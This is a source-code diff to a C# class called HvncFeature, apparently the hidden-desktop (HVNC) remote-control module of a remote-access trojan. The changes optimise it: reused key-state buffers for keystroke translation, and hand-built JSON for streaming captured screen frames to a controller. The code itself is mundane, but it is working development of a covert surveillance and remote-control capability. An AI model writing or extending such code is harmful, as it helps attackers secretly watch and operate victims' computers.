@@ -330,6 +330,8 @@ internal static class HvncFeature
 
     // Modifier key state — tracked by HandleKey, used by VkToChars
     private static bool _shiftDown, _ctrlDown, _altDown, _capsLock;
+    private static readonly byte[] _vkState = new byte[256];
+    private static readonly System.Text.StringBuilder _vkSb = new(8);
 
     // H264 encoder — null when unavailable (falls back to JPEG)
     private static H264Encoder? _h264Enc;
@@ -561,9 +563,9 @@ internal static class HvncFeature
                             var h264 = _h264Enc.Encode(_compBits, _canvasW * 4);
                             if (h264 != null)
                             {
-                                var frame = new H264FrameDataStub { W = _canvasW, H = _canvasH, D = Convert.ToBase64String(h264) };
+                                // Manual JSON — avoids JsonSerializer internal buffers + frame object alloc
                                 _send?.Invoke((int)PacketType.HvncH264Frame,
-                                    JsonSerializer.Serialize(frame, SeroJson.Default.H264FrameDataStub));
+                                    "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"D\":\"" + Convert.ToBase64String(h264) + "\"}");
                             }
                             else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                         }
@@ -575,9 +577,8 @@ internal static class HvncFeature
                         var jpeg = CaptureFrame();
                         if (jpeg != null)
                         {
-                            var frame = new HvncFrameDataStub { W = _canvasW, H = _canvasH, J = Convert.ToBase64String(jpeg) };
                             _send?.Invoke((int)PacketType.HvncFrame,
-                                JsonSerializer.Serialize(frame, SeroJson.Default.HvncFrameDataStub));
+                                "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"J\":\"" + Convert.ToBase64String(jpeg) + "\"}");
                         }
                         else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                     }
@@ -813,15 +814,15 @@ internal static class HvncFeature
     // Returns null if no printable translation exists.
     private static string? VkToChars(int vk)
     {
-        var state = new byte[256];
-        if (_shiftDown) state[0x10] = 0x80; // VK_SHIFT
-        if (_ctrlDown)  state[0x11] = 0x80; // VK_CONTROL
-        if (_altDown)   state[0x12] = 0x80; // VK_MENU
-        if (_capsLock)  state[0x14] = 0x01; // VK_CAPITAL (toggle bit)
+        Array.Clear(_vkState, 0, 256);
+        if (_shiftDown) _vkState[0x10] = 0x80; // VK_SHIFT
+        if (_ctrlDown)  _vkState[0x11] = 0x80; // VK_CONTROL
+        if (_altDown)   _vkState[0x12] = 0x80; // VK_MENU
+        if (_capsLock)  _vkState[0x14] = 0x01; // VK_CAPITAL (toggle bit)
         uint scan = MapVirtualKey((uint)vk, 0);
-        var sb = new System.Text.StringBuilder(8);
-        int n = ToUnicode((uint)vk, scan, state, sb, 8, 0);
-        return n > 0 ? sb.ToString(0, n) : null;
+        _vkSb.Clear();
+        int n = ToUnicode((uint)vk, scan, _vkState, _vkSb, 8, 0);
+        return n > 0 ? _vkSb.ToString(0, n) : null;
     }
 
     private static void ProcessInput(HvncInputDataStub inp)
